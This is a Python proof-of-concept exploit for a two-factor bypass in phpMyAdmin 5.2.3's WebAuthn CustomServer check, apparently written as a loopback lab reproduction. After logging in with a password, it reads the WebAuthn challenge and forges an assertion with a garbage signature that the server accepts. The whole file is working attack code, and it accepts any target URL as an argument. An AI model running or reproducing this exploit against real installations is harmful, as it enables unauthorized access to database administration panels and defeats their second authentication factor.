#!/usr/bin/env python3
"""phpMyAdmin 5.2.3 CustomServer WebAuthn 2FA bypass. Loopback lab client."""
from __future__ import annotations

import base64
import binascii
import hashlib
import html
import http.cookiejar
import json
import re
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass
from typing import Any
from urllib.parse import urlencode, urlparse
from urllib.request import OpenerDirector, Request

LABEL = "PMA-5.2.3-WebAuthn-2FA"
WITNESS = "PMA-WEBAUTHN-BYPASS"
USER = "appuser"
PASSWORD = "apppass"
DEFAULT_BASE = "http://127.0.0.1:18080"
LOGIN_PATH = "/index.php?route=/"
HTTP_TIMEOUT_S = 30
# 32 x 0xA1 - same as init.sql
CRED_RAW = bytes([0xA1]) * 32
USER_PRESENT_FLAGS = bytes([0x01])
SIGN_COUNT = b"\x00\x00\x00\x01"
GARBAGE_SIG = b"not-a-real-signature-" + WITNESS.encode()
TWO_FA_FIELD = "webauthn_request_response"
HOME_MARKERS = (
    "server-breadcrumb",
    'id="page_content"',
    "route=/server/databases",
    "sql.php",
)

REQUEST_OPTIONS_RE = re.compile(r'data-request-options="([^"]+)"', re.I)
ALERT_RE = re.compile(r"alert-danger[^>]*>.*?>([^<]+)")


@dataclass(frozen=True)
class Target:
    base: str
    origin: str
    host: str


def fail(reason: str) -> int:
    print(f"FAIL {reason}")
    return 1


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def extract(name: str, page: str) -> str | None:
    escaped = re.escape(name)
    pattern = (
        rf'name="{escaped}"[^>]*value="([^"]*)"'
        rf'|value="([^"]*)"[^>]*name="{escaped}"'
    )
    match = re.search(pattern, page, re.I)
    if match is None:
        return None
    return html.unescape(match.group(1) or match.group(2))


def extract_request_options(page: str) -> dict[str, Any] | None:
    match = REQUEST_OPTIONS_RE.search(page)
    if match is None:
        return None
    raw = html.unescape(match.group(1))
    loaded = json.loads(raw)
    if not isinstance(loaded, dict):
        return None
    return loaded


def two_fa_error_snippet(page: str) -> str:
    match = ALERT_RE.search(page)
    if match is not None:
        return match.group(1)
    marker = page.find("card-text")
    if marker >= 0:
        return page[marker : marker + 400]
    return page[:500]


def is_home_ui(page: str) -> bool:
    return any(marker in page for marker in HOME_MARKERS) or "logged_in" in page.lower()


def load_target(argv: list[str]) -> Target:
    base = argv[1] if len(argv) > 1 else DEFAULT_BASE
    parsed = urlparse(base)
    host = parsed.hostname or "127.0.0.1"
    origin = f"{parsed.scheme}://{parsed.netloc}"
    return Target(base=base, origin=origin, host=host)


class Client:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener: OpenerDirector = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def get(self, path: str) -> str:
        req = Request(self.base + path, method="GET")
        with self.opener.open(req, timeout=HTTP_TIMEOUT_S) as resp:
            return resp.read().decode("utf-8", "replace")

    def post(self, path: str, data: dict[str, str]) -> tuple[int, str]:
        body = urlencode(data).encode()
        req = Request(
            self.base + path,
            data=body,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        try:
            with self.opener.open(req, timeout=HTTP_TIMEOUT_S) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace")


def forge_assertion(challenge_std_b64: str, origin: str, host: str) -> str:
    """Assertion that satisfies CustomServer structural checks; signature is garbage."""
    challenge_raw = base64.b64decode(challenge_std_b64)
    client_data = {
        "type": "webauthn.get",
        "challenge": b64url(challenge_raw),
        "origin": origin,
    }
    client_json = json.dumps(client_data, separators=(",", ":")).encode()
    auth_data = sha256(host.encode("ascii")) + USER_PRESENT_FLAGS + SIGN_COUNT
    cred_id_url = b64url(CRED_RAW)
    cred_id_std = b64(CRED_RAW)
    return json.dumps(
        {
            "id": cred_id_url,
            "type": "public-key",
            "rawId": cred_id_std,
            "response": {
                "clientDataJSON": b64(client_json),
                "authenticatorData": b64(auth_data),
                "signature": b64(GARBAGE_SIG),
            },
        }
    )


def main() -> int:
    target = load_target(sys.argv)
    print(f"IOC target={target.base} origin={target.origin} host={target.host}")

    try:
        client = Client(target.base)
        login_html = client.get(LOGIN_PATH)
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return fail(f"login page unreachable: {exc}")

    token = extract("token", login_html)
    set_session = extract("set_session", login_html)
    if not token:
        return fail("no CSRF token on login page")

    fields = {
        "pma_username": USER,
        "pma_password": PASSWORD,
        "server": "1",
        "token": token,
        "set_session": set_session or "",
    }
    try:
        status, body = client.post(LOGIN_PATH, fields)
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return fail(f"password login failed: {exc}")
    print(f"IOC password-login status={status} webauthn={TWO_FA_FIELD in body}")

    if TWO_FA_FIELD not in body:
        print("FAIL expected WebAuthn 2FA prompt after password")
        print(body[:800])
        return 1

    try:
        opts = extract_request_options(body)
    except json.JSONDecodeError as exc:
        return fail(f"data-request-options is not JSON: {exc}")
    if opts is None:
        return fail("no data-request-options (not on WebAuthn 2FA page)")

    challenge = opts.get("challenge")
    if not isinstance(challenge, str) or not challenge:
        return fail("no challenge in request options")
    print(f"IOC challenge={challenge[:24]}…")

    try:
        assertion = forge_assertion(challenge, target.origin, target.host)
    except (ValueError, binascii.Error) as exc:
        return fail(f"cannot forge assertion: {exc}")

    token2 = extract("token", body) or token
    try:
        status2, body2 = client.post(
            LOGIN_PATH,
            {
                "server": "1",
                "token": token2,
                "webauthn_request_response": assertion,
            },
        )
    except (urllib.error.URLError, TimeoutError, OSError) as exc:
        return fail(f"2FA post failed: {exc}")

    still_2fa = TWO_FA_FIELD in body2
    landed = is_home_ui(body2)
    print(f"IOC 2fa-post status={status2} still_2fa={still_2fa} landed={landed}")
    if still_2fa:
        print("FAIL still on 2FA page", two_fa_error_snippet(body2))
        return 1
    if not landed:
        print("FAIL 2FA cleared but home UI not recognized")
        print(body2[:600])
        return 1
    print(f"SUCCESS {WITNESS} WebAuthn 2FA accepted with garbage signature")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
